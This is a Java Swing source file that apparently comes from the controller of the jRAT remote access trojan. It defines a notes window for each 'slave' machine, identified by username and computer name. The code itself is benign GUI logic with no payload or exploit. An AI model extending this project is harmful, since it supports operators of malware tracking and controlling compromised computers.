package se.jrat.controller.ui.frames;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.JToolBar;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;

import se.jrat.controller.ErrorDialog;
import se.jrat.controller.Notes;
import se.jrat.controller.Slave;
import se.jrat.controller.utils.IconUtils;


@SuppressWarnings("serial")
public class FrameNotes extends BaseFrame {

	private JPanel contentPane;
	private Slave slave;
	private JTextPane txt;

	public FrameNotes(Slave sl) {
		super();
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				save();
			}
		});
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameNotes.class.getResource("/icons/notes.png")));
		this.slave = sl;
		setTitle("Notes - " + getDisplayName());
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 367, 285);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JToolBar toolBar = new JToolBar();
		toolBar.setFloatable(false);

		JButton btnSave = new JButton("Save");
		btnSave.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				save();
			}
		});
		btnSave.setIcon(IconUtils.getIcon("save"));
		toolBar.add(btnSave);

		JButton btnLoad = new JButton("Load");
		btnLoad.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					JFileChooser c = new JFileChooser();
					c.showOpenDialog(null);
					File file = c.getSelectedFile();

					if (file != null) {
						BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
						String line;
						String s = "";

						while ((line = reader.readLine()) != null) {
							s += line + "\n\r";
						}

						reader.close();

						txt.setText(s);
					}
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		btnLoad.setIcon(IconUtils.getIcon("folder-go"));
		toolBar.add(btnLoad);

		JButton btnClose = new JButton("Close");
		btnClose.setIcon(IconUtils.getIcon("delete"));
		btnClose.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setVisible(false);
				dispose();
			}
		});
		toolBar.add(btnClose);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		txt = new JTextPane();
		txt.setBackground(new Color(255, 250, 205));
		scrollPane.setViewportView(txt);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addComponent(toolBar, GroupLayout.PREFERRED_SIZE, 341, GroupLayout.PREFERRED_SIZE)
				.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 341, GroupLayout.PREFERRED_SIZE)
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addComponent(toolBar, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 211, GroupLayout.PREFERRED_SIZE))
		);
		contentPane.setLayout(gl_contentPane);

		load();
	}

	public String getDisplayName() {
		return slave.getUsername() + "@" + slave.getComputerName();
	}

	public void load() {
		try {
			String str = Notes.load(getDisplayName());
			txt.setText(str);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void save() {
		try {
			Notes.save(txt.getText(), getDisplayName());
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
